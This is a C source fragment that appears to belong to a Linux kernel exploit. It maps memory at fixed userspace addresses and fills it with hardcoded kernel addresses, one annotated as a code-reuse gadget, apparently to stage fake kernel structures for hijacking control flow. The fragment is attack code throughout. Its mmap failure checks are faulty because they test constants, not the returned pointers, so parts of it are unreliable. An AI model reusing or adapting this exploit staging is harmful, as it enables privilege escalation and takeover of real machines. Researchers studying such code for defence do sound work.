#define userspace_base_to_map 0x66666000
#define userspace_base_to_map_2 0x00000000fffff000

void * userspace_base;
void * userspace_base_2;
void mmap_userspace_base(){
    userspace_base = mmap((void *)userspace_base_to_map,0x1000 * 2,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if (userspace_base_to_map<0){
        perror("mmap failed");
    }

    userspace_base_2 = mmap((void *)userspace_base_to_map_2,0x1000 * 2,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if (userspace_base_to_map_2<0){
        perror("mmap failed");
    }
}

void init_userspace_base(){
    mmap_userspace_base();
    *(unsigned long*)(userspace_base + 0x1000)=0xffffffff81122288;
    *(unsigned long*)(userspace_base + 0x1018)=0x1;
    *(unsigned long*)(userspace_base + 0x1020)=0xffffffff811b7f4f; //: mov eax, dword ptr [rax + 0x40] ; call qword ptr [rbx];
    *(unsigned long*)(userspace_base + 0x1068)=0x200000001;
    *(unsigned long*)(userspace_base + 0x1070)=0x100;
    *(unsigned long*)(userspace_base + 0x1080)=0x66667000;

    *(unsigned long*)(userspace_base_2 + 0xff3 + 0x40)=0x81122288;

}
